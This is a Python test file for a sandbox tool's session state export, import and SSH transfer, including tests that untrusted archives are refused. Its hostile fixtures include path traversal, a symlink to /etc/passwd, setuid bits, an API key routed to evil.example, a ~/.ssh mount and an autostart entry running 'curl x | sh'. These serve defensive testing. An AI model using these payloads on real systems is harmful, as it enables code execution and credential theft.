"""A session with its state to another system (session_state.py): `session export` with its state's parts and a
manifest, `session import` of an untrusted archive (traversal, links, devices, setuid bits, huge headers, checksums,
options a start would refuse, secrets and approvals asked), `session duplicate`, and `session copy|move` over SSH -
the parts below the launcher's own dry run with only the process boundaries stood in for; the real entry point with
the live fakes in test_session_state_live.py."""
import gzip
import hashlib
import importlib.util
import io
import json
import os
from pathlib import Path
import sys
import tarfile

import pytest

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("sandbox_sessions_state_test", ROOT / "sandbox/sessions.py")
m = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(m)


@pytest.fixture(autouse=True)
def isolated(tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "config"))
    monkeypatch.setenv("XDG_RUNTIME_DIR", str(tmp_path / "runtime"))
    (tmp_path / "runtime").mkdir()
    monkeypatch.setattr(m, "PROC", tmp_path / "proc")
    (tmp_path / "proc").mkdir()
    monkeypatch.setattr(sys.stdin, "isatty", lambda: False)
    st = m.session_state()
    st._modules.clear()  # (each test its own state folders: modules that cached a path are loaded again)
    checked = []
    monkeypatch.setattr(m, "check_start", lambda key, data: checked.append((key, dict(data))))
    return checked


@pytest.fixture
def st():
    return m.session_state()


def put(root, relative, data, mtime=None):
    path = Path(root) / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data if isinstance(data, bytes) else data.encode())
    if mtime:
        os.utime(path, (mtime, mtime))
    return path


def make_session(tmp_path, name="work", agent="claude", options=(), workspace=None):
    """A stopped session NAME with its HOME kept, its workspace a folder of tmp_path."""
    workspace = Path(workspace or tmp_path / "src" / "proj")
    workspace.mkdir(parents=True, exist_ok=True)
    directory = m.session_dir(name)
    (directory / "home").mkdir(parents=True)
    data = {"agent": agent, "options": ["--workspace", str(workspace), *options], "agent_args": ["--model", "opus",
                                                                                              "fix the tests"],
            "backend": "podman", "workspace": str(workspace), "cwd": str(workspace), "created": "2026-11-20T00:00:00Z",
            "keep": True, "ready": True, "name": name, "project": "proj", "run": f"{agent}-0badc0de",
            "pod": f"agent-{agent}-0badc0de"}
    m.save(name, data)
    return directory / "home", workspace


def export(st, tmp_path, name="work", **kwargs):
    out = tmp_path / f"{name}-{len(list(tmp_path.glob('*.tar.gz')))}.tar.gz"
    return st.export_state(m, name, str(out), **kwargs), out


def members(path):
    with tarfile.open(path) as tar:
        return {member.name: (tar.extractfile(member).read() if member.isfile() else None) for member in tar}


# --- export: the state's parts and the manifest ----------------------------------------------------------------------

def test_export_holds_the_state_and_a_manifest_of_every_file(tmp_path, st):
    home, workspace = make_session(tmp_path)
    put(home, ".claude/projects/-work/conv.jsonl", '{"type": "user"}\n', mtime=1_700_000_000)
    put(home, ".claude/.credentials.json", '{"token": "sk-real"}')
    kits = st.module("kits")
    store = kits.memory_store(str(workspace), "claude")
    put(store, ".claude/CLAUDE.md", "# remember the build\n")
    put(store, ".claude/projects/-work/memory/MEMORY.md", "- [a](a.md)\n")
    put(workspace, "main.py", "print(1)\n")
    put(workspace, ".env", "TOKEN=abc\n")
    cp = st.module("checkpoints")
    cp.take(str(workspace), [{"host": str(workspace), "sandbox": "/work"}], kind="start", start="work", name="work",
            agent="claude")
    approved = tmp_path / "config" / "sandbox-ai" / "approved.json"
    put(approved, "", json.dumps({str(workspace): {"hosts": ["pypi.org"], "tcp": ["192.0.2.7:5432"]}}))
    result, out = export(st, tmp_path)
    found = members(out)
    manifest = json.loads(found["work/manifest.json"])
    assert manifest["schema"] == "sandbox-ai-session-archive" and manifest["version"] == 2
    for name, (size, digest) in manifest["members"].items():
        assert len(found[name]) == size and hashlib.sha256(found[name]).hexdigest() == digest, name
    assert {n for n, d in found.items() if d is not None} - {"work/manifest.json"} == set(manifest["members"])
    assert found["work/home/.claude/projects/-work/conv.jsonl"] == b'{"type": "user"}\n'
    assert "work/home/.claude/.credentials.json" not in found and b"sk-real" not in out.read_bytes()
    assert found["work/memory/.claude/CLAUDE.md"] == b"# remember the build\n"
    parts = manifest["parts"]
    assert parts["memory"]["source"] == "store" and parts["memory"]["files"] == 2
    assert parts["start"]["agent"] == "claude" and parts["start"]["agent_args"] == ["--model", "opus"]
    assert parts["start"]["options"][:2] == ["--workspace", str(workspace)]
    assert len(parts["checkpoints"]["ids"]) == 1
    # The checkpoint's .env is a secret by its name: not in the archive, skipped in the checkpoint (a restore keeps it).
    ident = parts["checkpoints"]["ids"][0]
    document = json.loads(gzip.decompress(found[f"work/checkpoints/manifests/{ident}.json.gz"]))
    assert [e[1] for e in document["roots"][0]["entries"] if e[0] == "f"] == ["main.py"]
    assert any(path == ".env" for path, _ in document["roots"][0]["skipped"])
    assert parts["approvals"]["always"] == {"hosts": ["pypi.org"], "tcp": ["192.0.2.7:5432"]}
    assert parts["workspace"] is None and not any(n.startswith("work/workspace") for n in found)
    text = "\n".join(st.export_lines(result))
    assert "1 checkpoints" in text and "--allow-host pypi.org" in text and "2 memory files" in text


def test_a_running_session_is_paused_for_the_snapshot_and_thawed(tmp_path, st, monkeypatch):
    make_session(tmp_path)
    states, calls = ["running"], []
    monkeypatch.setattr(m, "status", lambda key, data: states[-1])
    monkeypatch.setattr(m, "pause", lambda key: calls.append("pause") or states.append("paused"))
    monkeypatch.setattr(m, "resume", lambda key: calls.append("resume") or states.append("running"))
    monkeypatch.setattr(st.si(), "export", lambda *a, **k: calls.append("export") or {"parts": {}})
    st.export_state(m, "work", str(tmp_path / "x.tar.gz"))
    assert calls == ["pause", "export", "resume"]
    calls.clear()
    st.export_state(m, "work", str(tmp_path / "y.tar.gz"), keep_paused=True)
    assert calls == ["pause", "export"], "a move keeps it paused until it runs at the other end"


def test_the_archive_is_never_written_into_the_workspace_it_takes(tmp_path, st):
    _, workspace = make_session(tmp_path)
    with pytest.raises(ValueError, match="lies in the workspace"):
        st.export_state(m, "work", str(workspace / "x.tar.gz"), with_workspace=True)


# --- import: a round trip --------------------------------------------------------------------------------------------

def test_import_makes_a_stopped_session_that_resumes_its_conversation(tmp_path, st, isolated):
    home, workspace = make_session(tmp_path)
    put(home, ".claude/projects/-work/conv.jsonl", '{"type": "user"}\n', mtime=1_700_000_000)
    store = st.module("kits").memory_store(str(workspace), "claude")
    put(store, ".claude/CLAUDE.md", "# remember\n")
    put(workspace, "main.py", "print(1)\n")
    cp = st.module("checkpoints")
    cp.take(str(workspace), [{"host": str(workspace), "sandbox": "/work"}], kind="start", start="work", name="work",
            agent="claude")
    _, out = export(st, tmp_path)
    there = tmp_path / "there" / "proj"
    there.mkdir(parents=True)
    result = st.import_archive(m, out, "moved", [f"{workspace}={there}"])
    assert result["imported"] and result["name"] == "moved"
    data = m.load(result["id"])
    assert data["options"][:3] == ["--no-config", "--workspace", str(there)] and str(workspace) not in json.dumps(data)
    assert data["cwd"] == str(there) and data["workspace"] == str(there) and data["keep"] and data["ready"]
    assert data["agent_args"] == ["--model", "opus"], "its options; the task is not run again"
    assert m.restart_args(data) == ["--model", "opus", "--continue"], "the agent continues its conversation"
    conv = Path(result["home"]) / ".claude/projects/-work/conv.jsonl"
    assert conv.read_text() == '{"type": "user"}\n' and int(conv.stat().st_mtime) == 1_700_000_000
    assert oct(conv.stat().st_mode & 0o7777) == "0o600"
    # The dry run of the launcher, with the options as kept.
    (key, checked), = isolated
    assert key == result["id"] and checked["options"] == data["options"]
    # Its memory into the project's store there; its checkpoints into that project's store, as its own.
    assert (st.module("kits").memory_store(str(there), "claude") / ".claude/CLAUDE.md").read_text() == "# remember\n"
    listed = cp.listing(project=str(there))
    assert len(listed) == 1 and listed[0]["start"] == result["id"] and listed[0]["name"] == "moved"
    assert listed[0]["roots"][0]["host"] == str(there)
    document = cp.store_by_name(listed[0]["store"]).manifest(listed[0]["id"])
    assert document["roots"][0]["host"] == str(there)
    record, _ = cp.resolve_run("moved")
    assert record["checkpoint"] == listed[0]["id"]
    # Nothing staged is left.
    assert not [p for p in m.root().iterdir() if p.name.startswith((".import-", ".transfer-"))]
    assert "sandbox-ai resume moved" in "\n".join(st.import_lines(result))


def test_check_keeps_nothing_and_a_refused_dry_run_leaves_nothing(tmp_path, st, monkeypatch):
    make_session(tmp_path)
    _, out = export(st, tmp_path)
    def kept():
        return sorted(p.name for p in m.root().iterdir() if not p.name.endswith(".lock"))
    before = kept()
    result = st.import_archive(m, out, "other", check=True)
    assert result["checked"] and not result["imported"]
    assert kept() == before

    def refuse(key, data):
        raise ValueError("a start with these options would be refused, so nothing was changed:\n  policy says no")
    monkeypatch.setattr(m, "check_start", refuse)
    with pytest.raises(ValueError, match="policy says no"):
        st.import_archive(m, out, "other", yes=True)
    assert kept() == before


def test_a_name_there_already_is_refused_unless_replaced(tmp_path, st, monkeypatch):
    make_session(tmp_path)
    _, out = export(st, tmp_path)
    with pytest.raises(ValueError, match="there is a session work here already"):
        st.import_archive(m, out, yes=True)
    monkeypatch.setattr(m, "lost", lambda key, data: False)
    result = st.import_archive(m, out, replace=True, yes=True)
    assert result["imported"] and result["replaces"]
    assert [m.display(p.name, json.loads((p / "session.json").read_text())) for p in m.root().iterdir()
            if (p / "session.json").exists()] == ["work"]


def test_the_workspace_goes_along_into_an_empty_place_only(tmp_path, st):
    _, workspace = make_session(tmp_path)
    put(workspace, "src/app.py", "x = 1\n")
    os.symlink("/etc/passwd", workspace / "link")
    result, out = export(st, tmp_path, with_workspace=True)
    assert result["parts"]["workspace"]["files"] == 1
    assert any(item["path"] == "workspace/link" for item in result["left_out"])
    there = tmp_path / "there"
    (there / "full").mkdir(parents=True)
    put(there / "full", "mine.txt", "mine")
    with pytest.raises(ValueError, match="has files already"):
        st.import_archive(m, out, "copy", [f"{workspace}={there / 'full'}"])
    assert (there / "full" / "mine.txt").read_text() == "mine" and not (there / "full" / "src").exists()
    st.import_archive(m, out, "copy", [f"{workspace}={there / 'full'}"], no_workspace=True)
    result = st.import_archive(m, out, "copy2", [f"{workspace}={there / 'new'}"])
    assert (there / "new" / "src/app.py").read_text() == "x = 1\n" and result["workspace_files"]
    assert not (there / "new" / "link").exists()


# --- import: the archive is untrusted --------------------------------------------------------------------------------

def crafted(path, entries, manifest=True, prefix="evil", version=2, start=None, extra=None):
    """An archive of ENTRIES [(name, kind, data, mode)] (kind: file, dir, symlink, hardlink, fifo, chr) with a
    manifest of its files (MANIFEST True), none (False), or the dict given."""
    files = {}
    with tarfile.open(path, "w:gz", format=tarfile.PAX_FORMAT) as tar:
        for name, kind, data, mode in entries:
            info = tarfile.TarInfo(name)
            info.mode = mode
            if kind == "file":
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
                files[name] = [len(data), hashlib.sha256(data).hexdigest()]
                continue
            info.type = {"dir": tarfile.DIRTYPE, "symlink": tarfile.SYMTYPE, "hardlink": tarfile.LNKTYPE,
                         "fifo": tarfile.FIFOTYPE, "chr": tarfile.CHRTYPE}[kind]
            if kind in ("symlink", "hardlink"):
                info.linkname = data
            tar.addfile(info)
        if manifest is not False:
            document = manifest if isinstance(manifest, dict) else {
                "schema": "sandbox-ai-session-archive", "version": version, "prefix": prefix, "name": "evil",
                "members": files, "parts": {"start": start or {"agent": "claude", "options": [], "agent_args": [],
                                                               "cwd": "/", "workspace": None}, **(extra or {})}}
            data = json.dumps(document).encode()
            info = tarfile.TarInfo(f"{prefix}/manifest.json")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return path


HOSTILE = {
    "traversal": ([("evil/../../outside.txt", "file", b"x", 0o644)], "leads outside"),
    "absolute": ([("/tmp/evil-absolute.txt", "file", b"x", 0o644)], "leads outside"),
    "other folder": ([("evil/a", "file", b"x", 0o644), ("other/b", "file", b"x", 0o644)], "outside the archive's"),
    "symlink": ([("evil/home/.bashrc", "symlink", "/etc/passwd", 0o777)], "is a link"),
    "hardlink": ([("evil/home/x", "hardlink", "evil/home/y", 0o644)], "is a link"),
    "fifo": ([("evil/home/pipe", "fifo", None, 0o644)], "is a FIFO"),
    "device": ([("evil/home/kmem", "chr", None, 0o666)], "is a device"),
    "twice": ([("evil/home/a", "file", b"1", 0o644), ("evil/home/a", "file", b"2", 0o644)], "twice"),
    "escape in a name": ([("evil/home/\x1b]0;x\x07", "file", b"x", 0o644)], "not one of an export"),
}


@pytest.mark.parametrize("case", sorted(HOSTILE))
def test_a_hostile_archive_is_refused_and_leaves_nothing(tmp_path, st, case):
    entries, said = HOSTILE[case]
    path = crafted(tmp_path / "evil.tar.gz", entries)
    with pytest.raises(st.ImportRefused, match=said):
        st.import_archive(m, path, "evil")
    assert not (tmp_path / "outside.txt").exists() and not Path("/tmp/evil-absolute.txt").exists()
    assert not m.root().exists() or not [p for p in m.root().iterdir() if not p.name.startswith(".names")]


def test_setuid_and_other_bits_are_cut_to_the_owners(tmp_path, st):
    path = crafted(tmp_path / "a.tar.gz", [("evil/home/tool", "file", b"#!/bin/sh\n", 0o6777),
                                          ("evil/home/data", "file", b"x", 0o4666)])
    result = st.import_archive(m, path, "fine")
    home = Path(result["home"])
    assert oct((home / "tool").stat().st_mode & 0o7777) == "0o700"
    assert oct((home / "data").stat().st_mode & 0o7777) == "0o600"


def test_the_manifest_is_checked(tmp_path, st):
    file = [("evil/home/a", "file", b"hello", 0o644)]
    with pytest.raises(st.ImportRefused, match="no manifest.json"):
        st.import_archive(m, crafted(tmp_path / "1.tar.gz", file, manifest=False), "x")
    with pytest.raises(st.ImportRefused, match="newer sandbox-ai"):
        st.import_archive(m, crafted(tmp_path / "2.tar.gz", file, version=3), "x")
    wrong = {"schema": "sandbox-ai-session-archive", "version": 2, "prefix": "evil",
             "members": {"evil/home/a": [5, "0" * 64]}, "parts": {}}
    with pytest.raises(st.ImportRefused, match="does not match its manifest"):
        st.import_archive(m, crafted(tmp_path / "3.tar.gz", file, manifest=wrong), "x")
    unlisted = {**wrong, "members": {}}
    with pytest.raises(st.ImportRefused, match="not in its manifest"):
        st.import_archive(m, crafted(tmp_path / "4.tar.gz", file, manifest=unlisted), "x")
    missing = {**wrong, "members": {"evil/home/a": [5, hashlib.sha256(b"hello").hexdigest()],
                                    "evil/home/b": [1, "0" * 64]}}
    with pytest.raises(st.ImportRefused, match="not in the archive"):
        st.import_archive(m, crafted(tmp_path / "5.tar.gz", file, manifest=missing), "x")
    (tmp_path / "6.tar.gz").write_bytes(b"not an archive at all")
    with pytest.raises(st.ImportRefused, match="not a tar.gz"):
        st.import_archive(m, tmp_path / "6.tar.gz", "x")


def test_limits_hold(tmp_path, st, monkeypatch):
    monkeypatch.setattr(st.si(), "EXPORT_FILE_LIMIT", 10)
    monkeypatch.setattr(st, "MANIFEST_LIMIT", 10)
    with pytest.raises(st.ImportRefused, match="larger than"):
        st.import_archive(m, crafted(tmp_path / "1.tar.gz", [("evil/home/a", "file", b"x" * 100, 0o644)]), "x")
    monkeypatch.setattr(st.si(), "EXPORT_FILE_LIMIT", 1 << 20)
    monkeypatch.setattr(st.si(), "EXPORT_TOTAL", 150)
    with pytest.raises(st.ImportRefused, match="too large to import"):
        st.import_archive(m, crafted(tmp_path / "2.tar.gz", [(f"evil/home/{i}", "file", b"x" * 60, 0o644)
                                                              for i in range(3)]), "x")
    monkeypatch.setattr(st.si(), "EXPORT_FILES", 3)
    with pytest.raises(st.ImportRefused, match="more than 3 files"):
        st.import_archive(m, crafted(tmp_path / "3.tar.gz", [(f"evil/h{i}", "file", b"", 0o644)
                                                              for i in range(8)]), "x")
    monkeypatch.setattr(st, "HEADER_LIMIT", 100)
    path = tmp_path / "4.tar.gz"
    with tarfile.open(path, "w:gz", format=tarfile.PAX_FORMAT) as tar:
        info = tarfile.TarInfo("evil/a")
        info.pax_headers = {"comment": "x" * 5000}
        tar.addfile(info, io.BytesIO(b""))
    with pytest.raises(st.ImportRefused, match="a tar header of"):
        st.import_archive(m, path, "x")


@pytest.mark.parametrize("options, said", [
    (["--state-dir", "/home/me"], "never holds"), (["--tmux-socket-dir=/x"], "never holds"),
    (["--internal-attach-probe"], "never holds"), (["--no-such-option"], "not ones this sandbox-ai takes")])
def test_options_a_session_never_saves_or_the_launcher_refuses_are_refused(tmp_path, st, options, said):
    path = crafted(tmp_path / "a.tar.gz", [("evil/home/a", "file", b"x", 0o644)],
                   start={"agent": "claude", "options": options, "agent_args": [], "cwd": "/"})
    with pytest.raises(st.ImportRefused, match=said):
        st.import_archive(m, path, "x")
    path = crafted(tmp_path / "b.tar.gz", [("evil/home/a", "file", b"x", 0o644)],
                   start={"agent": "rm -rf", "options": [], "agent_args": [], "cwd": "/"})
    with pytest.raises(st.ImportRefused, match="not one of this sandbox-ai's"):
        st.import_archive(m, path, "x")


def test_secrets_and_folders_of_this_machine_are_asked_first(tmp_path, st):
    start = {"agent": "claude", "options": ["--api-key", "evil.example=OPENAI_API_KEY", "--mount",
                                            "/home/me/.ssh:/mnt/ssh:ro"], "agent_args": [], "cwd": "/"}
    path = crafted(tmp_path / "a.tar.gz", [("evil/home/a", "file", b"x", 0o644)], start=start)
    with pytest.raises(ValueError, match="confirm with --yes") as refused:
        st.import_archive(m, path, "x")
    assert "--api-key evil.example=OPENAI_API_KEY" in str(refused.value) and "/home/me/.ssh" in str(refused.value)
    with pytest.raises(ValueError, match="not confirmed"):
        st.import_archive(m, path, "x", ask=lambda question: "n")
    assert not [p for p in m.root().iterdir() if (p / "session.json").exists()]
    result = st.import_archive(m, path, "x", ask=lambda question: "y")
    assert result["imported"] and len(result["asked"]) == 2


def test_network_approvals_are_granted_again_only_when_asked(tmp_path, st):
    extra = {"approvals": {"run": {"hosts": ["api.example.org"], "tcp": ["192.0.2.1:22"]},
                           "always": {"hosts": ["pypi.org"], "tcp": []}, "not_carried": ["mcp: tool x"]}}
    path = crafted(tmp_path / "a.tar.gz", [("evil/home/a", "file", b"x", 0o644)], extra=extra)
    result = st.import_archive(m, path, "one")
    assert result["granted"] == [] and "--allow-host" not in m.load(result["id"])["options"]
    assert "not granted (--grant-approvals" in "\n".join(st.import_lines(result))
    with pytest.raises(ValueError, match="confirm the network approvals with --yes"):
        st.import_archive(m, path, "two", grant=True)
    result = st.import_archive(m, path, "three", grant=True, ask=lambda question: "y")
    assert m.load(result["id"])["options"][-6:] == ["--allow-host", "api.example.org", "--allow-tcp", "192.0.2.1:22",
                                                   "--allow-host", "pypi.org"]
    result = st.import_archive(m, path, "four", grant=True, ask=lambda question: "n")
    assert result["granted"] == []


def test_a_checkpoint_whose_content_is_not_its_name_is_refused(tmp_path, st):
    _, workspace = make_session(tmp_path)
    put(workspace, "main.py", "print(1)\n")
    st.module("checkpoints").take(str(workspace), [{"host": str(workspace), "sandbox": "/work"}], start="work")
    _, out = export(st, tmp_path)
    found = members(out)
    manifest = json.loads(found.pop("work/manifest.json"))
    name = next(n for n in found if "/objects/" in n)
    found[name] = b"print('owned')\n"
    manifest["members"][name] = [len(found[name]), hashlib.sha256(found[name]).hexdigest()]
    entries = [(n, "file", d, 0o600) for n, d in found.items() if d is not None]
    crafted(tmp_path / "t.tar.gz", entries, manifest=manifest, prefix="work")
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    with pytest.raises(st.ImportRefused, match="is not what its name says"):
        st.import_archive(m, tmp_path / "t.tar.gz", "t", [f"{workspace}={elsewhere}"])
    assert not st.module("kits").memory_store(str(elsewhere), "claude").exists()
    assert not st.module("checkpoints").listing(project=str(elsewhere)) and not [p for p in m.root().iterdir() if (p / "session.json").exists()
                                           and p.name != "work"]


# --- duplicate here ----------------------------------------------------------------------------------------------------

def test_duplicate_makes_a_second_session_with_its_own_home(tmp_path, st):
    home, workspace = make_session(tmp_path)
    put(home, ".claude/projects/-work/conv.jsonl", "{}\n")
    result = st.duplicate(m, "work", "work-2")
    data = m.load(result["id"])
    assert result["imported"] and data["workspace"] == str(workspace), "the workspace is shared"
    assert Path(result["home"]) != home and (Path(result["home"]) / ".claude/projects/-work/conv.jsonl").exists()
    assert m.load("work")["name"] == "work", "the original stays as it was"
    copied = st.duplicate(m, "work", "work-3", with_workspace=True)
    assert m.load(copied["id"])["workspace"] == f"{workspace}-work-3" and Path(f"{workspace}-work-3").is_dir()
    with pytest.raises(ValueError, match="not a session name"):
        st.duplicate(m, "work", "../x")


# --- copy and move over SSH -------------------------------------------------------------------------------------------

class Host:
    """A host for a copy with state: what `session import -` there says, what `session resume` says."""

    def __init__(self, imported=(0, '{"asked": [], "warnings": []}', ""), resumed=(0, "", ""), probe=(0, "usage", "")):
        self.imported, self.resumed, self.probe, self.calls, self.archives = imported, resumed, probe, [], []

    def run_file(self, host, args, source, timeout=3600):
        self.calls.append(list(args))
        self.archives.append(members(source))
        return self.imported

    def run(self, host, args, timeout=120):
        self.calls.append(list(args))
        if args == ["session", "import", "--help"]:
            return self.probe
        return self.resumed


def test_move_sends_the_state_starts_it_there_then_stops_it_here(tmp_path, st, monkeypatch):
    make_session(tmp_path)
    stopped, lines = [], []
    monkeypatch.setattr(m, "stop", lambda key: stopped.append(key))
    host = Host()
    assert st.transfer(m, "work", "ct1", maps=["/a=/b"], move=True, run=host.run, run_file=host.run_file,
                       out=lines.append) == 0
    probe, imported, resumed = host.calls
    assert probe == ["session", "import", "--help"], "the host asked first, before the snapshot"
    assert imported[:6] == ["session", "import", "-", "--as", "work", "--json"] and "--map=/a=/b" in imported
    assert "--grant-approvals" not in imported and resumed == ["session", "resume", "work"]
    assert "work/manifest.json" in host.archives[0]
    assert stopped == [] and "its conversation continued" in lines[-2], "a stopped session is not stopped again"
    assert not [p for p in m.root().iterdir() if p.name.startswith(".transfer-")]


def test_a_move_that_fails_there_thaws_it_here(tmp_path, st, monkeypatch):
    make_session(tmp_path)
    states, calls = ["running"], []
    monkeypatch.setattr(m, "status", lambda key, data: states[-1])
    monkeypatch.setattr(m, "pause", lambda key: calls.append("pause") or states.append("paused"))
    monkeypatch.setattr(m, "resume", lambda key: calls.append("thaw") or states.append("running"))
    monkeypatch.setattr(m, "stop", lambda key: calls.append("stop"))
    lines = []
    host = Host(resumed=(1, "", "agent-sandbox: no podman there\n"))
    assert st.transfer(m, "work", "ct1", move=True, run=host.run, run_file=host.run_file, out=lines.append) == 1
    assert calls == ["pause", "thaw"] and "its start there failed" in " ".join(lines)
    calls.clear()
    host = Host()
    assert st.transfer(m, "work", "ct1", move=True, run=host.run, run_file=host.run_file, out=lines.append) == 0
    assert calls == ["pause", "stop"], "paused until it runs there, then stopped here"
    calls.clear()
    states.append("running")
    assert st.transfer(m, "work", "ct1", run=host.run, run_file=host.run_file, out=lines.append) == 0
    assert calls == ["pause", "thaw"], "a copy thaws it right after the snapshot"


def test_what_the_host_says_is_said(tmp_path, st):
    make_session(tmp_path)
    # Not reached, or an older sandbox-ai there: said before any snapshot is taken (nothing exported, nothing sent).
    for probe, said in (((255, "", "ssh: connect to host ct1 port 22: No route to host\n"),
                         "ct1 was not reached over SSH (exit status 255): nothing was copied"),
                        ((2, "", "sandbox-ai session: error: argument command: invalid choice: 'import'\n"),
                         "is older and cannot take a session's state")):
        host, lines = Host(probe=probe), []
        assert st.transfer(m, "work", "ct1", run=host.run, run_file=host.run_file, out=lines.append) == 1
        assert said in " ".join(lines) and host.archives == [], lines
    host, lines = Host(imported=(1, "", "sandbox-ai session: there is a session work here already\n")), []
    assert st.transfer(m, "work", "ct1", run=host.run, run_file=host.run_file, out=lines.append) == 1
    assert "cannot be imported on ct1" in " ".join(lines) and len(host.calls) == 2, lines
    host, lines = Host(), []
    assert st.transfer(m, "work", "ct1", check=True, run=host.run, run_file=host.run_file, out=lines.append) == 0
    assert "--check" in host.calls[1] and len(host.calls) == 2 and "nothing kept there" in lines[-1]


def test_secrets_and_approvals_go_along_only_when_confirmed(tmp_path, st):
    home, workspace = make_session(tmp_path)
    put(home, ".claude/.credentials.json", '{"token": "sk-real"}')
    put(tmp_path / "config" / "sandbox-ai" / "approved.json", "", json.dumps({str(workspace): {"hosts": ["pypi.org"]}}))
    host = Host()
    with pytest.raises(ValueError, match="confirm it with --yes"):
        st.transfer(m, "work", "ct1", include_secrets=True, run=host.run, run_file=host.run_file, out=print)
    assert host.calls == []
    assert st.transfer(m, "work", "ct1", include_secrets=True, grant=True, yes=True, run=host.run,
                       run_file=host.run_file, out=print) == 0
    assert "--grant-approvals" in host.calls[1]
    assert "work/home/.claude/.credentials.json" in host.archives[0]


def test_where_the_archive_would_write_on_this_machine_is_asked_before_anything_is_written(tmp_path, st):
    """An archive names its own workspace: one that holds files would write them there (an autostart folder, say).
    A folder no --map of yours placed is asked first - refused without a yes, and nothing is written there."""
    target = tmp_path / "victim" / ".config" / "autostart"
    start = {"agent": "claude", "options": ["--workspace", str(target)], "agent_args": [], "cwd": str(target),
             "workspace": str(target)}
    entries = [("evil/workspace/evil.desktop", "file", b"[Desktop Entry]\nExec=sh -c 'curl x | sh'\n", 0o755)]
    path = crafted(tmp_path / "a.tar.gz", entries, start=start, extra={"workspace": {"host": str(target), "files": 1}})
    with pytest.raises(ValueError, match="confirm with --yes") as refused:
        st.import_archive(m, path, "x")
    assert "the workspace it works in, its files from the archive written there" in str(refused.value)
    assert not target.exists() and not (tmp_path / "victim").exists()
    with pytest.raises(ValueError, match="not confirmed"):
        st.import_archive(m, path, "x", ask=lambda question: "n")
    assert not (tmp_path / "victim").exists()
    mine = tmp_path / "mine"
    result = st.import_archive(m, path, "x", [f"{target}={mine}"])  # (you said where: nothing to ask)
    assert result["asked"] == [] and (mine / "evil.desktop").exists() and not target.exists()


def test_a_checkpoint_of_a_folder_the_configuration_does_not_name_is_left_out(tmp_path, st):
    """A restore writes into a checkpoint's folder: an archive never chooses another folder of this machine so."""
    _, workspace = make_session(tmp_path)
    put(workspace, "main.py", "print(1)\n")
    other = tmp_path / "other"
    put(other, "x.txt", "x")
    cp = st.module("checkpoints")
    cp.take(str(workspace), [{"host": str(workspace), "sandbox": "/work"},
                             {"host": str(other), "sandbox": "/mnt/other", "kind": "mount"}], start="work")
    _, out = export(st, tmp_path)
    there = tmp_path / "there"
    there.mkdir()
    result = st.import_archive(m, out, "moved", [f"{workspace}={there}"], yes=True)
    [meta] = cp.listing(project=str(there))
    assert [r["host"] for r in meta["roots"]] == [str(there)]
    assert [r["host"] for r in cp.store_by_name(meta["store"]).manifest(meta["id"])["roots"]] == [str(there)]
    assert result["checkpoints"]["ids"] == [meta["id"]]
